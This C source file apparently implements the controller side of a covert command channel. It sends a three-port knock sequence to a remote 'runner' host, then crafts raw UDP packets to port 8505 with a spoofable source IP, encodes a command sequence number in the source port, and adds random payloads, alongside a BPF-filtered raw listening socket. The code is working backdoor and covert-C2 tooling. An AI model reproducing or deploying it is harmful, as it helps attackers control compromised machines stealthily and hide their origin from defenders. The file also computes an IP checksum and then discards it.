#include "network.h"

#include <arpa/inet.h>
#include <linux/filter.h>
#include <linux/if_ether.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>


#define KNOCKS 3
#define COVERT_CHAN 8505
#define KNOCK2 1999
#define KNOCK3 1201

#define PKT_MAX_LEN 4096
#define IP_VERSION 4
#define IP_IHL 5             // 5 * 32-bit words = 20 bytes
#define IP_FRAG_OFF 0
#define IP_HDR_TOS 0
#define IP_HDR_TTL 64

int setup_covert_fd(void) {
    const int fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (fd == -1) {
        fprintf(stderr, "covert socket() failed\n");
        return -1;
    }

    const int one = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        fprintf(stderr, "setsockopt(IPPROTO_IP, IP_HDRINCL) failed\n");
        return -1;
    }

    struct sock_filter code[] = {

        BPF_STMT(BPF_LD  | BPF_B | BPF_ABS, 9),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, IPPROTO_UDP, 0, 5),

        BPF_STMT(BPF_LD  | BPF_B | BPF_ABS, 0),
        BPF_STMT(BPF_ALU | BPF_AND | BPF_K, 0x0F),
        BPF_STMT(BPF_ALU | BPF_LSH | BPF_K, 2),

        BPF_STMT(BPF_LD  | BPF_H | BPF_IND, 2),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, COVERT_CHAN, 0, 1),

        BPF_STMT(BPF_RET | BPF_K, 0xFFFFFFFF),
        BPF_STMT(BPF_RET | BPF_K, 0),
    };

    struct sock_fprog bpf = {
        .len = sizeof(code) / sizeof(code[0]),
        .filter = code,
    };

    if (setsockopt(fd, SOL_SOCKET, SO_ATTACH_FILTER, &bpf, sizeof(bpf)) < 0) {
        fprintf(stderr, "setsockopt(SO_ATTACH_FILTER) failed\n");
        return -1;
    }

    return fd;
}

int perform_knock(const struct Context *ctx) {
    const int KNOCK_PORTS[KNOCKS] = {COVERT_CHAN, KNOCK2, KNOCK3};
    struct sockaddr_in dest = {0};
    dest.sin_family = AF_INET;
    if (inet_pton(AF_INET, ctx->runner_ip, &dest.sin_addr) != 1) {
        perror("inet_pton");
        return -1;
    }

    for (int i = 0; i < KNOCKS; i++) {
        const int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd == -1) {
            perror("socket");
            return -1;
        }

        dest.sin_port = htons(KNOCK_PORTS[i]);

        if (connect(fd, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
            perror("connect");
            close(fd);
            return -1;
        }

        close(fd);

        sleep(1);
    }

    return 0;
}

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;

    for (; len > 1; len -= 2) {
        sum += *buf++;
    }
    if (len == 1) {
        sum += *(unsigned char *)buf;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short) (~sum);
}

int send_packet(struct Context *ctx, const char *ip_src_addr) {
    uint16_t *udp_src_port = &ctx->cmd_seq_num;

    uint8_t packet[PKT_MAX_LEN] = {0};

    struct iphdr *ip = (struct iphdr *)packet;
    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
    uint8_t *payload = (uint8_t *) udp + sizeof (struct udphdr);
    const uint16_t payload_size = rand_payload(ctx, payload);
    const uint16_t pkt_len = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;

    ip->ihl = IP_IHL;
    ip->version = IP_VERSION;
    ip->tos = IP_HDR_TOS;
    ip->tot_len = htons(pkt_len);
    ip->id = htons(rand_u16(ctx));
    ip->frag_off = IP_FRAG_OFF;
    ip->ttl = IP_HDR_TTL;
    ip->protocol = IPPROTO_UDP;
    ip->saddr = inet_addr(ip_src_addr);
    ip->daddr = inet_addr(ctx->runner_ip);
    checksum(ip, ip->ihl * 4);

    udp->source = htons(*udp_src_port);
    udp->dest = htons(COVERT_CHAN);
    udp->len = htons(sizeof(struct udphdr) + payload_size);
    udp->check = 0;

    struct sockaddr_in dest = {0};
    dest.sin_family = AF_INET;
    dest.sin_port = udp->dest;
    dest.sin_addr.s_addr = ip->daddr;

    sendto(ctx->covert_fd, packet, pkt_len, 0, (struct sockaddr *)&dest, sizeof(dest));
    (ctx->cmd_seq_num)++;

    return 0;
}
